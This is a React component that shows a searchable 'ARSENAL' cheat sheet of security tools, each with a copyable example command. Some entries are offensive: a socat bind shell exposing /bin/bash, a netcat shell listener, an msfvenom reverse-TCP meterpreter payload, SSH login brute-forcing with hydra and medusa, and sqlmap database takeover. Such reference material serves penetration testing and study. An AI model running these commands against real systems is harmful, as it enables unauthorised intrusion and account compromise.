import { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Search, Command, ChevronRight } from 'lucide-react';

type Tool = {
  name: string;
  category: string;
  desc: string;
  cmd: string;
};

const TOOLS: Tool[] = [
  // Recon
  { name: 'nmap', category: 'Recon', desc: 'Network exploration tool and security / port scanner', cmd: 'nmap -sV -sC -p- target' },
  { name: 'masscan', category: 'Recon', desc: 'TCP port scanner, spews SYN packets asynchronously', cmd: 'masscan -p1-65535,U:1-65535 target --rate=1000' },
  { name: 'amass', category: 'Recon', desc: 'In-depth attack surface mapping and asset discovery', cmd: 'amass enum -d target.com' },
  { name: 'subfinder', category: 'Recon', desc: 'Fast passive subdomain enumeration tool', cmd: 'subfinder -d target.com' },
  { name: 'dnsx', category: 'Recon', desc: 'Fast and multi-purpose DNS toolkit', cmd: 'dnsx -l subdomains.txt -resp' },
  { name: 'httpx', category: 'Recon', desc: 'Fast and multi-purpose HTTP toolkit', cmd: 'httpx -l targets.txt -sc -title' },
  { name: 'nuclei', category: 'Recon', desc: 'Fast and customizable vulnerability scanner', cmd: 'nuclei -u target.com -t cves/' },
  { name: 'theharvester', category: 'Recon', desc: 'E-mails, subdomains and names OSINT', cmd: 'theHarvester -d target.com -b all' },
  { name: 'whatweb', category: 'Recon', desc: 'Next generation web scanner', cmd: 'whatweb target.com' },
  
  // Web
  { name: 'sqlmap', category: 'Web', desc: 'Automatic SQL injection and database takeover tool', cmd: 'sqlmap -u "target.com/page?id=1" --dbs' },
  { name: 'nikto', category: 'Web', desc: 'Web server scanner', cmd: 'nikto -h target.com' },
  { name: 'dirb', category: 'Web', desc: 'Web content scanner', cmd: 'dirb http://target.com' },
  { name: 'gobuster', category: 'Web', desc: 'Directory/File, DNS and VHost busting tool', cmd: 'gobuster dir -u target.com -w wordlist.txt' },
  { name: 'ffuf', category: 'Web', desc: 'Fast web fuzzer written in Go', cmd: 'ffuf -w wordlist.txt -u target.com/FUZZ' },
  { name: 'wfuzz', category: 'Web', desc: 'Web application fuzzer', cmd: 'wfuzz -c -z file,wordlist.txt target.com/FUZZ' },
  { name: 'mitmproxy', category: 'Web', desc: 'Interactive TLS-capable intercepting HTTP proxy', cmd: 'mitmproxy' },
  
  // Password
  { name: 'hashcat', category: 'Password', desc: 'World\'s fastest and most advanced password recovery utility', cmd: 'hashcat -m 0 hash.txt wordlist.txt' },
  { name: 'john', category: 'Password', desc: 'John the Ripper password cracker', cmd: 'john --wordlist=wordlist.txt hash.txt' },
  { name: 'hydra', category: 'Password', desc: 'Login cracker which supports numerous protocols', cmd: 'hydra -l user -P pass.txt ssh://target' },
  { name: 'medusa', category: 'Password', desc: 'Speedy, parallel, and modular login brute-forcer', cmd: 'medusa -h target -u user -P pass.txt -M ssh' },
  
  // Network
  { name: 'tcpdump', category: 'Network', desc: 'Command-line packet analyzer', cmd: 'tcpdump -i eth0 -w capture.pcap' },
  { name: 'tshark', category: 'Network', desc: 'Network protocol analyzer', cmd: 'tshark -r capture.pcap' },
  { name: 'netcat', category: 'Network', desc: 'Networking utility for reading from and writing to network connections', cmd: 'nc -lvnp 4444' },
  { name: 'socat', category: 'Network', desc: 'Multipurpose relay (SOcket CAT)', cmd: 'socat TCP4-LISTEN:443,reuseaddr,fork EXEC:/bin/bash' },
  { name: 'proxychains', category: 'Network', desc: 'Force any TCP connection through proxy', cmd: 'proxychains nmap target.com' },
  
  // Exploitation
  { name: 'metasploit', category: 'Exploitation', desc: 'Penetration testing framework', cmd: 'msfconsole' },
  { name: 'msfvenom', category: 'Exploitation', desc: 'Payload generator', cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f elf' },
  
  // Forensics
  { name: 'binwalk', category: 'Forensics', desc: 'Firmware analysis tool', cmd: 'binwalk -e firmware.bin' },
  { name: 'foremost', category: 'Forensics', desc: 'Console program to recover files based on their headers', cmd: 'foremost -i image.dd' },
  { name: 'volatility', category: 'Forensics', desc: 'Advanced memory forensics framework', cmd: 'volatility -f mem.raw imageinfo' },
  { name: 'strings', category: 'Forensics', desc: 'Find printable strings in a binary file', cmd: 'strings binary_file' },
  { name: 'xxd', category: 'Forensics', desc: 'Make a hexdump or do the reverse', cmd: 'xxd file.bin' },
  
  // Browsers
  { name: 'chromium', category: 'Browsers', desc: 'Headless / GUI browser', cmd: 'chromium --headless --dump-dom target.com' },
  { name: 'lynx', category: 'Browsers', desc: 'Text web browser', cmd: 'lynx target.com' },
  { name: 'w3m', category: 'Browsers', desc: 'Text-based web browser and pager', cmd: 'w3m target.com' },
  { name: 'elinks', category: 'Browsers', desc: 'Advanced text web browser', cmd: 'elinks target.com' },
  { name: 'links2', category: 'Browsers', desc: 'Text and graphics web browser', cmd: 'links2 -g target.com' },
  
  // Utils
  { name: 'git', category: 'Utils', desc: 'Version control system', cmd: 'git clone https://github.com/repo' },
  { name: 'python3', category: 'Utils', desc: 'Python interpreter', cmd: 'python3 -m http.server 8000' },
  { name: 'tmux', category: 'Utils', desc: 'Terminal multiplexer', cmd: 'tmux new -s hacking' },
  { name: 'htop', category: 'Utils', desc: 'Interactive process viewer', cmd: 'htop' },
  { name: 'vim', category: 'Utils', desc: 'Text editor', cmd: 'vim script.py' },
  { name: 'jq', category: 'Utils', desc: 'Command-line JSON processor', cmd: 'cat file.json | jq .' },
  { name: 'ripgrep', category: 'Utils', desc: 'Line-oriented search tool', cmd: 'rg "password" .' },
  { name: 'curl', category: 'Utils', desc: 'Transfer data from or to a server', cmd: 'curl -I target.com' },
  { name: 'wget', category: 'Utils', desc: 'Non-interactive network downloader', cmd: 'wget -r target.com' },
  { name: 'docker', category: 'Utils', desc: 'Containerization platform', cmd: 'docker run -it ubuntu /bin/bash' },
];

const CATEGORIES = ['All', ...Array.from(new Set(TOOLS.map(t => t.category)))];

export function Tools() {
  const [search, setSearch] = useState('');
  const [activeCategory, setActiveCategory] = useState('All');
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);

  const filteredTools = useMemo(() => {
    return TOOLS.filter(tool => {
      const matchesSearch = tool.name.toLowerCase().includes(search.toLowerCase()) || 
                            tool.desc.toLowerCase().includes(search.toLowerCase());
      const matchesCategory = activeCategory === 'All' || tool.category === activeCategory;
      return matchesSearch && matchesCategory;
    });
  }, [search, activeCategory]);

  const copyToClipboard = (cmd: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedCmd(cmd);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="flex flex-col p-4 md:p-8 h-full"
    >
      <div className="mb-6 space-y-4">
        <h1 className="text-2xl font-mono font-bold tracking-widest text-primary glow-text flex items-center gap-3">
          <Command className="w-6 h-6" />
          ARSENAL
        </h1>
        
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="text"
            placeholder="Search tools, modules, utilities..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-card border border-border/50 focus:border-primary focus:ring-1 focus:ring-primary rounded-md py-3 pl-10 pr-4 font-mono text-sm outline-none transition-all"
          />
        </div>

        <div className="flex overflow-x-auto pb-2 -mx-4 px-4 md:mx-0 md:px-0 gap-2 scrollbar-hide no-scrollbar">
          {CATEGORIES.map(cat => (
            <button
              key={cat}
              onClick={() => setActiveCategory(cat)}
              className={`whitespace-nowrap px-4 py-1.5 rounded-full text-xs font-mono transition-all border ${
                activeCategory === cat 
                  ? 'border-primary bg-primary/10 text-primary glow-box' 
                  : 'border-border/50 text-muted-foreground hover:border-primary/50 hover:text-foreground'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>
      </div>

      <div className="flex-1 overflow-y-auto pr-2 -mr-2 space-y-4 pb-20">
        <AnimatePresence>
          {filteredTools.length === 0 ? (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center py-12 text-muted-foreground font-mono text-sm"
            >
              No modules found matching criteria.
            </motion.div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredTools.map((tool, idx) => (
                <motion.div
                  key={tool.name}
                  layout
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: Math.min(idx * 0.05, 0.5) }}
                  className="group flex flex-col bg-card border border-border/50 rounded-lg overflow-hidden hover:border-primary/50 transition-all hover:shadow-[0_0_15px_rgba(0,255,255,0.05)] hover:-translate-y-1 cursor-pointer"
                  onClick={() => copyToClipboard(tool.cmd)}
                >
                  <div className="p-4 flex-1 border-b border-border/20">
                    <div className="flex items-center justify-between mb-2">
                      <h3 className="font-mono font-bold text-foreground group-hover:text-primary transition-colors">
                        {tool.name}
                      </h3>
                      <span className="text-[10px] font-mono uppercase tracking-wider px-2 py-0.5 rounded border border-border/50 text-muted-foreground bg-background">
                        {tool.category}
                      </span>
                    </div>
                    <p className="text-sm text-muted-foreground leading-relaxed">
                      {tool.desc}
                    </p>
                  </div>
                  <div className="p-3 bg-muted/20 flex items-center justify-between group-hover:bg-primary/5 transition-colors">
                    <code className="text-xs font-mono text-primary/70 truncate mr-2">
                      {copiedCmd === tool.cmd ? 'Copied to clipboard!' : `$ ${tool.cmd}`}
                    </code>
                    <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-transform group-hover:translate-x-1" />
                  </div>
                </motion.div>
              ))}
            </div>
          )}
        </AnimatePresence>
      </div>

      <style dangerouslySetInnerHTML={{__html: `
        .no-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .no-scrollbar {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}} />
    </motion.div>
  );
}
